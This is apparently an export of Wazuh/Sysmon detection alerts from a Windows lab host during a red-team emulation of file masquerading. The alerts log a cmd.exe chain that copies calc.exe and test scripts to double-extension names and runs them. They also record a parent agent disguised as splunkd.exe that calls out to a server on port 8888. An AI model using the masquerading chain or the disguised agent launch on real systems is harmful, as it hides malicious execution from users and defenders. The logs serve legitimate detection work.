wazuh-alerts-4.x-2024.11.30,0_o7fJMBRlc-D5DFWh-m,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:41:13.026
ProcessGuid: {15959494-CFA8-674A-2C07-000000000D00}
ProcessId: 6356
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_z3tpgoyd.3qk.ps1
CreationUtcTime: 2024-11-30 08:41:13.026
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:41:13.037692000Z,56795,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,7,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:41:14.164",EventChannel,1732956074.2668888,"Nov 30, 2024 @ 08:41:14.164", , , , , , , , , , , , ,6356, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-CFA8-674A-2C07-000000000D00},2024-11-30 08:41:13.026, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_z3tpgoyd.3qk.ps1,2024-11-30 08:41:13.026, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,vfoyfJMBRlc-D5DFgB_m,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:31:32.451
ProcessGuid: {15959494-CD63-674A-1207-000000000D00}
ProcessId: 4536
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_ugwdz41u.r5e.ps1
CreationUtcTime: 2024-11-30 08:31:32.451
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:31:32.453953800Z,56666,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,2,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:31:33.085",EventChannel,1732955493.2564848,"Nov 30, 2024 @ 08:31:33.085", , , , , , , , , , , , ,4536, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-CD63-674A-1207-000000000D00},2024-11-30 08:31:32.451, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ugwdz41u.r5e.ps1,2024-11-30 08:31:32.451, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,x_o3fJMBRlc-D5DFAR9R,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:36:34.116
ProcessGuid: {15959494-CE91-674A-2307-000000000D00}
ProcessId: 1856
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_kqym3oaw.ci0.ps1
CreationUtcTime: 2024-11-30 08:36:34.116
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:36:34.118949400Z,56724,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,4,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:36:35.060",EventChannel,1732955795.2607409,"Nov 30, 2024 @ 08:36:35.060", , , , , , , , , , , , ,1856, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-CE91-674A-2307-000000000D00},2024-11-30 08:36:34.116, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_kqym3oaw.ci0.ps1,2024-11-30 08:36:34.116, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,2fo8fJMBRlc-D5DF4R9I,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:42:54.939
ProcessGuid: {15959494-D00E-674A-3107-000000000D00}
ProcessId: 6780
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_t0otsage.dqx.ps1
CreationUtcTime: 2024-11-30 08:42:54.939
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:42:54.952510800Z,56844,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,10,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:42:56.081",EventChannel,1732956176.2699774,"Nov 30, 2024 @ 08:42:56.081", , , , , , , , , , , , ,6780, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-D00E-674A-3107-000000000D00},2024-11-30 08:42:54.939, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_t0otsage.dqx.ps1,2024-11-30 08:42:54.939, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,4vo_fJMBRlc-D5DFjB_1,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:45:50.708
ProcessGuid: {15959494-D0BE-674A-3407-000000000D00}
ProcessId: 3264
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_evbduubj.zpn.ps1
CreationUtcTime: 2024-11-30 08:45:50.708
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:45:50.711844000Z,56881,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,12,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:45:51.841",EventChannel,1732956351.2713944,"Nov 30, 2024 @ 08:45:51.841", , , , , , , , , , , , ,3264, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-D0BE-674A-3407-000000000D00},2024-11-30 08:45:50.708, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_evbduubj.zpn.ps1,2024-11-30 08:45:50.708, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,LPpYfJMBRlc-D5DFdCBH,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 09:13:00.877
ProcessGuid: {15959494-D71C-674A-7807-000000000D00}
ProcessId: 1920
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %%temp%%\T1036.003_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %%temp%%\T1036.003_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %%temp%%\T1036.003_masquerading.ps1.exe /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %%temp%%\T1036.003_masquerading.xls.vbs /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %%temp%%\T1036.003_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %%temp%%\T1036.003_masquerading.png.vbs /Y && copy ""107417_T1036.003_masquerading.ps1"" %%temp%%\T1036.003_masquerading.doc.ps1 /Y && copy ""107417_T1036.003_masquerading.ps1"" %%temp%%\T1036.003_masquerading.pdf.ps1 /Y && copy ""107417_T1036.003_masquerading.ps1"" %%temp%%\T1036.003_masquerading.rtf.ps1 /Y && %%temp%%\T1036.003_masquerading.docx.exe && %%temp%%\T1036.003_masquerading.pdf.exe && %%temp%%\T1036.003_masquerading.ps1.exe && %%temp%%\T1036.003_masquerading.xls.vbs && %%temp%%\T1036.003_masquerading.xlsx.vbs && %%temp%%\T1036.003_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.003_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.003_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.003_masquerading.rtf.ps1
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:13:00.879090600Z,57301,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,26,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:13:02.010",EventChannel,1732957982.3025506,"Nov 30, 2024 @ 09:13:02.010", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,1920, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-D71C-674A-7807-000000000D00},2024-11-30 09:13:00.877,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C copy \""C:\\Windows\\System32\\calc.exe\"" %%temp%%\\T1036.003_masquerading.docx.exe /Y &amp;&amp; copy \""C:\\Windows\\System32\\calc.exe\"" %%temp%%\\T1036.003_masquerading.pdf.exe /Y &amp;&amp; copy \""C:\\Windows\\System32\\calc.exe\"" %%temp%%\\T1036.003_masquerading.ps1.exe /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %%temp%%\\T1036.003_masquerading.xls.vbs /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %%temp%%\\T1036.003_masquerading.xlsx.vbs /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %%temp%%\\T1036.003_masquerading.png.vbs /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %%temp%%\\T1036.003_masquerading.doc.ps1 /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %%temp%%\\T1036.003_masquerading.pdf.ps1 /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %%temp%%\\T1036.003_masquerading.rtf.ps1 /Y &amp;&amp; %%temp%%\\T1036.003_masquerading.docx.exe &amp;&amp; %%temp%%\\T1036.003_masquerading.pdf.exe &amp;&amp; %%temp%%\\T1036.003_masquerading.ps1.exe &amp;&amp; %%temp%%\\T1036.003_masquerading.xls.vbs &amp;&amp; %%temp%%\\T1036.003_masquerading.xlsx.vbs &amp;&amp; %%temp%%\\T1036.003_masquerading.png.vbs &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %%temp%%\\T1036.003_masquerading.doc.ps1 &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %%temp%%\\T1036.003_masquerading.pdf.ps1 &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %%temp%%\\T1036.003_masquerading.rtf.ps1",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,MfpYfJMBRlc-D5DFdCBH,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-11-30 09:13:00.898
ProcessGuid: {15959494-D71C-674A-7807-000000000D00}
ProcessId: 1920
Image: C:\Windows\system32\cmd.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\T1036.003_masquerading.xlsx.vbs
CreationUtcTime: 2024-11-25 23:42:07.177
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:13:00.898916400Z,57318,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,37,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:13:02.275",EventChannel,1732957982.3048001,"Nov 30, 2024 @ 09:13:02.275", , , , , , , , , , , , ,1920, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\system32\\cmd.exe, , , , , , ,{15959494-D71C-674A-7807-000000000D00},2024-11-30 09:13:00.898, , , , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\T1036.003_masquerading.xlsx.vbs,2024-11-25 23:42:07.177, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,MvpYfJMBRlc-D5DFdCBH,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-11-30 09:13:00.899
ProcessGuid: {15959494-D71C-674A-7807-000000000D00}
ProcessId: 1920
Image: C:\Windows\system32\cmd.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\T1036.003_masquerading.png.vbs
CreationUtcTime: 2024-11-25 23:42:07.178
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:13:00.900399600Z,57320,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,38,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:13:02.308",EventChannel,1732957982.3050629,"Nov 30, 2024 @ 09:13:02.308", , , , , , , , , , , , ,1920, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\system32\\cmd.exe, , , , , , ,{15959494-D71C-674A-7807-000000000D00},2024-11-30 09:13:00.899, , , , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\T1036.003_masquerading.png.vbs,2024-11-25 23:42:07.178, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,N_pYfJMBRlc-D5DFdCBH,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1036,technique_name=Masquerading
UtcTime: 2024-11-30 09:13:01.151
ProcessGuid: {15959494-D71D-674A-7A07-000000000D00}
ProcessId: 4572
Image: C:\Users\mari\AppData\Local\Temp\T1036.003_masquerading.pdf.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Calculator
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: CALC.EXE
CommandLine: C:\Users\mari\AppData\Local\Temp\T1036.003_masquerading.pdf.exe  
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1A4E2C3BBC095CB7D9B85CABE2AEA2C9A769B480,MD5=AFAF2CDF9981342C494B28630608F74A,SHA256=284674A806BCBE692C76761BAAF21327638DE0C7135BFB06953648BE7D661FBD,IMPHASH=8EEAA9499666119D13B3F44ECD77A729
ParentProcessGuid: {15959494-D71C-674A-7807-000000000D00}
ParentProcessId: 1920
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.003_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.003_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.003_masquerading.ps1.exe /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %temp%\T1036.003_masquerading.xls.vbs /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %temp%\T1036.003_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %temp%\T1036.003_masquerading.png.vbs /Y && copy ""107417_T1036.003_masquerading.ps1"" %temp%\T1036.003_masquerading.doc.ps1 /Y && copy ""107417_T1036.003_masquerading.ps1"" %temp%\T1036.003_masquerading.pdf.ps1 /Y && copy ""107417_T1036.003_masquerading.ps1"" %temp%\T1036.003_masquerading.rtf.ps1 /Y && %temp%\T1036.003_masquerading.docx.exe && %temp%\T1036.003_masquerading.pdf.exe && %temp%\T1036.003_masquerading.ps1.exe && %temp%\T1036.003_masquerading.xls.vbs && %temp%\T1036.003_masquerading.xlsx.vbs && %temp%\T1036.003_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.rtf.ps1
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:13:01.152352600Z,57331,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,14,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:13:02.480",EventChannel,1732957982.3073690,"Nov 30, 2024 @ 09:13:02.480", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4572, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,CALC.EXE,C:\\Users\\mari\\AppData\\Local\\Temp\\T1036.003_masquerading.pdf.exe,Microsoft® Windows® Operating System, , ,Windows Calculator, , ,{15959494-D71D-674A-7A07-000000000D00},2024-11-30 09:13:01.151,"SHA1=1A4E2C3BBC095CB7D9B85CABE2AEA2C9A769B480,MD5=AFAF2CDF9981342C494B28630608F74A,SHA256=284674A806BCBE692C76761BAAF21327638DE0C7135BFB06953648BE7D661FBD,IMPHASH=8EEAA9499666119D13B3F44ECD77A729","technique_id=T1036,technique_name=Masquerading",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D71C-674A-7807-000000000D00},"cmd.exe /C copy \""C:\\Windows\\System32\\calc.exe\"" %temp%\\T1036.003_masquerading.docx.exe /Y &amp;&amp; copy \""C:\\Windows\\System32\\calc.exe\"" %temp%\\T1036.003_masquerading.pdf.exe /Y &amp;&amp; copy \""C:\\Windows\\System32\\calc.exe\"" %temp%\\T1036.003_masquerading.ps1.exe /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %temp%\\T1036.003_masquerading.xls.vbs /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %temp%\\T1036.003_masquerading.xlsx.vbs /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %temp%\\T1036.003_masquerading.png.vbs /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %temp%\\T1036.003_masquerading.doc.ps1 /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %temp%\\T1036.003_masquerading.pdf.ps1 /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %temp%\\T1036.003_masquerading.rtf.ps1 /Y &amp;&amp; %temp%\\T1036.003_masquerading.docx.exe &amp;&amp; %temp%\\T1036.003_masquerading.pdf.exe &amp;&amp; %temp%\\T1036.003_masquerading.ps1.exe &amp;&amp; %temp%\\T1036.003_masquerading.xls.vbs &amp;&amp; %temp%\\T1036.003_masquerading.xlsx.vbs &amp;&amp; %temp%\\T1036.003_masquerading.png.vbs &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.doc.ps1 &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.pdf.ps1 &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.rtf.ps1",0x107a6b,1920,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,C:\\Users\\mari\\AppData\\Local\\Temp\\T1036.003_masquerading.pdf.exe,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,OvpYfJMBRlc-D5DFdCBH,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 09:13:02.264
ProcessGuid: {15959494-D71E-674A-7D07-000000000D00}
ProcessId: 4604
Image: C:\Windows\System32\wscript.exe
FileVersion: 5.812.10240.16384
Description: Microsoft ® Windows Based Script Host
Product: Microsoft ® Windows Script Host
Company: Microsoft Corporation
OriginalFileName: wscript.exe
CommandLine: ""C:\Windows\System32\WScript.exe"" ""C:\Users\mari\AppData\Local\Temp\T1036.003_masquerading.xlsx.vbs""  
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=2661E5F3562DD03C0ED21C33E2888E2FD1137D8C,MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD
ParentProcessGuid: {15959494-D71C-674A-7807-000000000D00}
ParentProcessId: 1920
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.003_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.003_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.003_masquerading.ps1.exe /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %temp%\T1036.003_masquerading.xls.vbs /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %temp%\T1036.003_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %temp%\T1036.003_masquerading.png.vbs /Y && copy ""107417_T1036.003_masquerading.ps1"" %temp%\T1036.003_masquerading.doc.ps1 /Y && copy ""107417_T1036.003_masquerading.ps1"" %temp%\T1036.003_masquerading.pdf.ps1 /Y && copy ""107417_T1036.003_masquerading.ps1"" %temp%\T1036.003_masquerading.rtf.ps1 /Y && %temp%\T1036.003_masquerading.docx.exe && %temp%\T1036.003_masquerading.pdf.exe && %temp%\T1036.003_masquerading.ps1.exe && %temp%\T1036.003_masquerading.xls.vbs && %temp%\T1036.003_masquerading.xlsx.vbs && %temp%\T1036.003_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.rtf.ps1
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:13:02.265713100Z,57347,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,4,false,4,Command shell started script with /c modifier,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92005, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:13:03.307",EventChannel,1732957983.3109410,"Nov 30, 2024 @ 09:13:03.307", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4604, , , , , , , , , , ,"[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]", , , ,wscript.exe,C:\\Windows\\System32\\wscript.exe,Microsoft ® Windows Script Host, , ,Microsoft ® Windows Based Script Host, , ,{15959494-D71E-674A-7D07-000000000D00},2024-11-30 